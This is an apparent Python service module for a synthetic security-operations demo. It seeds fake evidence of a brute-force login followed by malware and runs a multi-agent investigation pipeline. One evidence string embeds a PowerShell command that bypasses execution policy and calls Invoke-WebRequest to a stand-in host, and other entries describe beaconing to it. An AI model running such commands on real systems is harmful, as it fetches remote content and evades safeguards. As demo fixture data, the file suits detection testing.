"""
Scenario Service (Module 3H)
Agentic SOC — Auditable AI Security Operations Center

Deterministic pipeline execution for the Synthetic True Positive demonstration scenario:
Evidence Engine -> Planner -> Critic -> Auditor -> Case JSON -> Trust Score.

Strictly synthetic demonstration data:
- No real infrastructure or credentials
- Synthetic RFC 5737 IP addresses (198.51.100.42)
- Synthetic test indicators and hashes
- Full multi-agent pipeline verification with 100% evidence corroboration
"""

import json
from datetime import datetime, timezone
from typing import List, Dict, Any, Optional
from sqlalchemy.orm import Session

from app.models.investigation import InvestigationModel
from app.models.evidence import EvidenceModel
from app.models.tool_execution import ToolExecutionModel
from app.models.critic import CriticReviewModel
from app.models.auditor import AuditedCaseModel
from app.schemas.evidence import EvidenceResponse
from app.schemas.scenario import TruePositiveScenarioResponse
from app.schemas.critic import CriticRequest, ClaimInput as CriticClaimInput
from app.schemas.auditor import AuditorRequest, AuditClaimInput
from app.services.evidence_service import compute_content_hash
from app.services.planner_service import create_or_update_investigation_plan
from app.services.critic_service import evaluate_draft_conclusion
from app.services.auditor_service import audit_investigation, export_canonical_case
from app.services.trust_score_service import get_investigation_trust_score

# Stable identifiers for the synthetic scenario
SYNTHETIC_INV_ID = "INV-TP-001"
SYNTHETIC_HOST = "TEST-SRV-APP-01.corp.test"
SYNTHETIC_ALERT = "Synthetic True Positive: Brute-Force Authentication Followed by Malicious Payload Execution"

SYNTHETIC_EVIDENCE_DEFS = [
    {
        "id": "E-TP-AUTH",
        "evidence_type": "SIEM_LOG",
        "source": "Synthetic SIEM / Auth Monitor",
        "timestamp": "2026-09-27 10:14:22 UTC",
        "raw_output": (
            "[SYNTHETIC TEST] EventID: 4625 (Failed Logon count: 14) followed by "
            "EventID: 4624 (Successful Logon) for user test_svc_backup from source IP 198.51.100.42. "
            "Anomalous authentication outside business hours."
        ),
    },
    {
        "id": "E-TP-HASH",
        "evidence_type": "HASH_LOOKUP",
        "source": "Synthetic Threat Intelligence / EDR",
        "timestamp": "2026-09-27 10:15:05 UTC",
        "raw_output": (
            "[SYNTHETIC TEST] Binary hash SHA-256 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 "
            "classified as MALICIOUS (Trojan.TestDropper.Simulated). Signature matches known test malware indicator."
        ),
    },
    {
        "id": "E-TP-PROC",
        "evidence_type": "EDR_EVENT",
        "source": "Synthetic Endpoint EDR",
        "timestamp": "2026-09-27 10:15:30 UTC",
        "raw_output": (
            "[SYNTHETIC TEST] Process tree: services.exe -> cmd.exe (PID 8192) -> "
            'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://198.51.100.42:8080/beacon.test". '
            "Suspicious process execution on TEST-SRV-APP-01."
        ),
    },
    {
        "id": "E-TP-NET",
        "evidence_type": "SANDBOX_RESULT",
        "source": "Synthetic Network Sandbox",
        "timestamp": "2026-09-27 10:16:10 UTC",
        "raw_output": (
            "[SYNTHETIC TEST] Sandbox behavioral detonation verdict: MALICIOUS. "
            "Outbound TCP beaconing to synthetic test C2 destination 198.51.100.42:8080 every 30 seconds. "
            "Temporal correlation connects authentication at 10:14:22, process execution at 10:15:30, and network beaconing at 10:16:10."
        ),
    },
]

SYNTHETIC_TOOL_EXECS = [
    {
        "id": "EXEC-TP-001",
        "tool_name": "siem_search",
        "input": {"query": "EventID:4625 198.51.100.42", "timeframe": "24h"},
        "output": {"matches": 15, "detected": True},
        "success": True,
        "timestamp": "2026-09-27 10:14:25 UTC",
        "evidence_id": "E-TP-AUTH",
    },
    {
        "id": "EXEC-TP-002",
        "tool_name": "hash_lookup",
        "input": {"hash": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"},
        "output": {"verdict": "MALICIOUS", "malware_family": "Trojan.TestDropper.Simulated"},
        "success": True,
        "timestamp": "2026-09-27 10:15:08 UTC",
        "evidence_id": "E-TP-HASH",
    },
    {
        "id": "EXEC-TP-003",
        "tool_name": "edr_process_search",
        "input": {"host": SYNTHETIC_HOST, "process": "powershell.exe"},
        "output": {"pid": 8192, "parent_pid": 4812, "lineage": "services.exe -> cmd.exe -> powershell.exe"},
        "success": True,
        "timestamp": "2026-09-27 10:15:32 UTC",
        "evidence_id": "E-TP-PROC",
    },
    {
        "id": "EXEC-TP-004",
        "tool_name": "sandbox_summary",
        "input": {"sample_id": "SANDBOX-TP-TEST", "destination": "198.51.100.42:8080"},
        "output": {"verdict": "MALICIOUS", "c2_traffic": True, "beacon_interval_sec": 30},
        "success": True,
        "timestamp": "2026-09-27 10:16:15 UTC",
        "evidence_id": "E-TP-NET",
    },
]

SYNTHETIC_CLAIMS_INPUT = [
    {
        "claim": "Suspicious anomalous authentication occurred from external IP 198.51.100.42 on host TEST-SRV-APP-01",
        "evidence_ids": ["E-TP-AUTH"],
    },
    {
        "claim": "Observed binary payload hash matches known malicious test malware indicator",
        "evidence_ids": ["E-TP-HASH"],
    },
    {
        "claim": "PowerShell process execution occurred spawning outbound network beaconing command",
        "evidence_ids": ["E-TP-PROC", "E-TP-NET"],
    },
    {
        "claim": "Temporal correlation connects authentication, malicious process execution, and network beaconing across the synthetic event timeline",
        "evidence_ids": ["E-TP-AUTH", "E-TP-HASH", "E-TP-PROC", "E-TP-NET"],
    },
]

SYNTHETIC_DRAFT_CONCLUSION = (
    "Synthetic True Positive scenario: Anomalous authentication, observed malicious binary hash, "
    "and outbound beaconing are corroborated by forensic telemetry."
)


def run_true_positive_scenario(db: Session, force_reset: bool = True) -> TruePositiveScenarioResponse:
    """
    Execute the deterministic Synthetic True Positive Scenario (Module 3H).
    Runs the complete multi-agent SOC pipeline:
    1. Seed parent synthetic investigation in SQLite
    2. Populate verified synthetic evidence items with SHA-256 hashes
    3. Record allow-listed tool execution history
    4. Generate Planner Agent plan
    5. Run Critic / Red-Team review (validates claim support)
    6. Run Auditor Agent (evaluates NO EVIDENCE -> NO CLAIM and seals case)
    7. Export Canonical Case JSON (Module 3F)
    8. Compute Evidence & Audit Quality Trust Score (Module 3G)
    """
    # 1. Parent synthetic investigation
    inv = db.query(InvestigationModel).filter(InvestigationModel.id == SYNTHETIC_INV_ID).first()
    now_utc = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    if not inv:
        inv = InvestigationModel(
            id=SYNTHETIC_INV_ID,
            alert_name=SYNTHETIC_ALERT,
            target_host=SYNTHETIC_HOST,
            severity="Critical",
            event_timestamp="2026-09-27 10:14:00 UTC",
            description=(
                "[SYNTHETIC TEST DEMONSTRATION] Multiple failed authentication attempts from external test IP 198.51.100.42 "
                "followed by successful logon, scheduled task execution with known malicious hash, and outbound HTTP beaconing."
            ),
            status="Investigating",
            evidence_count=len(SYNTHETIC_EVIDENCE_DEFS),
            trust_score=100,
            created_at=now_utc,
            assigned_agent="Host Triage Agent",
            mitre_technique="T1110 (Brute Force) / T1059.001 (PowerShell)",
        )
        db.add(inv)
        db.commit()
        db.refresh(inv)

    # 2. Reset and seed synthetic evidence items with SHA-256 hashes
    evidence_models: List[EvidenceModel] = []
    for ev_def in SYNTHETIC_EVIDENCE_DEFS:
        existing_ev = db.query(EvidenceModel).filter(EvidenceModel.id == ev_def["id"]).first()
        content_hash = compute_content_hash(ev_def["raw_output"])

        if existing_ev:
            existing_ev.investigation_id = SYNTHETIC_INV_ID
            existing_ev.evidence_type = ev_def["evidence_type"]
            existing_ev.source = ev_def["source"]
            existing_ev.timestamp = ev_def["timestamp"]
            existing_ev.raw_output = ev_def["raw_output"]
            existing_ev.content_hash = content_hash
            existing_ev.status = "COLLECTED"
            evidence_models.append(existing_ev)
        else:
            new_ev = EvidenceModel(
                id=ev_def["id"],
                investigation_id=SYNTHETIC_INV_ID,
                evidence_type=ev_def["evidence_type"],
                source=ev_def["source"],
                timestamp=ev_def["timestamp"],
                raw_output=ev_def["raw_output"],
                content_hash=content_hash,
                status="COLLECTED",
                created_at=ev_def["timestamp"],
            )
            db.add(new_ev)
            evidence_models.append(new_ev)

    db.commit()

    # 3. Seed synthetic tool executions
    for tool_def in SYNTHETIC_TOOL_EXECS:
        existing_t = db.query(ToolExecutionModel).filter(ToolExecutionModel.id == tool_def["id"]).first()
        if not existing_t:
            new_t = ToolExecutionModel(
                id=tool_def["id"],
                investigation_id=SYNTHETIC_INV_ID,
                tool_name=tool_def["tool_name"],
                input=json.dumps(tool_def["input"]),
                output=json.dumps(tool_def["output"]),
                success=tool_def["success"],
                timestamp=tool_def["timestamp"],
                evidence_id=tool_def["evidence_id"],
            )
            db.add(new_t)

    db.commit()

    # 4. Pipeline Step 1: Planner Agent
    planner_res = create_or_update_investigation_plan(db, SYNTHETIC_INV_ID, SYNTHETIC_ALERT)

    # 5. Pipeline Step 2: Critic / Red-Team Review
    critic_req = CriticRequest(
        investigation_id=SYNTHETIC_INV_ID,
        draft_conclusion=SYNTHETIC_DRAFT_CONCLUSION,
        claims=[
            CriticClaimInput(claim=c["claim"], evidence_ids=c["evidence_ids"])
            for c in SYNTHETIC_CLAIMS_INPUT
        ],
    )
    critic_res = evaluate_draft_conclusion(db, SYNTHETIC_INV_ID, critic_req)

    # 6. Pipeline Step 3: Auditor Agent
    auditor_req = AuditorRequest(
        investigation_id=SYNTHETIC_INV_ID,
        claims=[
            AuditClaimInput(claim=c["claim"], evidence_ids=c["evidence_ids"])
            for c in SYNTHETIC_CLAIMS_INPUT
        ],
        critic_findings=[obj.model_dump() for obj in critic_res.objections],
        final_conclusion=SYNTHETIC_DRAFT_CONCLUSION,
    )
    audited_case_res = audit_investigation(db, SYNTHETIC_INV_ID, auditor_req)

    # 7. Pipeline Step 4: Canonical Case JSON (Module 3F)
    case_json_res = export_canonical_case(db, SYNTHETIC_INV_ID, audited_case_res.case_id)

    # 8. Pipeline Step 5: Trust Score Engine (Module 3G)
    trust_score_res = get_investigation_trust_score(db, SYNTHETIC_INV_ID, audited_case_res.case_id)

    # Build response model
    ev_responses = [
        EvidenceResponse(
            id=ev.id,
            investigation_id=ev.investigation_id,
            evidence_type=ev.evidence_type,
            source=ev.source,
            timestamp=ev.timestamp,
            query=None,
            raw_output=ev.raw_output,
            content_hash=ev.content_hash,
            status=ev.status,
            created_at=ev.created_at,
            integrity_verified=True,
        )
        for ev in evidence_models
    ]

    supported_count = sum(1 for c in audited_case_res.claims if c.status == "SUPPORTED")

    explanation = (
        f"Synthetic True Positive scenario executed across the complete SOC pipeline. "
        f"All {len(SYNTHETIC_CLAIMS_INPUT)} claims are fully corroborated by verified cryptographic SHA-256 evidence. "
        f"Planner generated {len(planner_res.plan)} sequential steps. "
        f"Critic reviewed claims with status '{critic_res.overall_status}'. "
        f"Auditor verified case with zero contradictions or unsupported attributions. "
        f"Trust Score computed: {trust_score_res.trust_score}/100 ({trust_score_res.explanation.verdict})."
    )

    return TruePositiveScenarioResponse(
        scenario_id="SCENARIO-TRUE-POSITIVE",
        scenario_name="Synthetic True Positive Demonstration",
        is_synthetic=True,
        status="VERIFIED_TRUE_POSITIVE",
        investigation_id=SYNTHETIC_INV_ID,
        target_host=SYNTHETIC_HOST,
        alert_name=SYNTHETIC_ALERT,
        evidence_count=len(ev_responses),
        supported_claims_count=supported_count,
        evidence_items=ev_responses,
        planner=planner_res,
        critic=critic_res,
        audited_case=audited_case_res,
        case_json=case_json_res,
        trust_score=trust_score_res,
        explanation=explanation,
        executed_at=now_utc,
    )


def get_true_positive_scenario(db: Session) -> TruePositiveScenarioResponse:
    """
    Retrieve or initialize the Synthetic True Positive demonstration scenario.
    """
    return run_true_positive_scenario(db, force_reset=False)
